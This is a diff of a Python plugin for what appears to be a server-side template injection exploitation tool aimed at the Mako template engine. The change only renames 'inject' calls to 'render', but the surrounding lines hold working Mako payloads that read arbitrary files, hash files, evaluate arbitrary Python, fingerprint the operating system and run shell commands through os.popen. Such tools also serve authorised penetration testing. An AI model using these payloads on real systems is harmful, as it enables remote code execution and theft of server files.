@@ -19,15 +19,15 @@ class Mako(Plugin):
             'truncate' : """open("%(path)s", 'w').close()"""
         },
         'read' : {
-            'call': 'inject',
+            'call': 'render',
             'read' : """<%% x=__import__("base64").b64encode(open("%(path)s", "rb").read()) %%>${x}"""
         },
         'md5' : {
-            'call': 'inject',
+            'call': 'render',
             'md5': """<%% x=__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest() %%>${x}"""
         },
         'evaluate' : {
-            'call': 'inject',
+            'call': 'render',
             'evaluate': '<%% %(code)s %%>'
         }
 
@@ -66,7 +66,7 @@ class Mako(Plugin):
         payload = '${"%s".join("%s")}' % (randA, randB)
         expected = randA.join(randB)
 
-        if expected == self.inject(payload):
+        if expected == self.render(payload):
             self.set('language', 'python')
             self.set('engine', 'mako')
             self.set('eval', 'python')
@@ -79,8 +79,8 @@ class Mako(Plugin):
 
         payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
         self.set('eval', 'python')
-        self.set('os', self.inject(payload))
+        self.set('os', self.render(payload))
 
     def execute(self, command):
 
-        return self.inject("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
+        return self.render("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
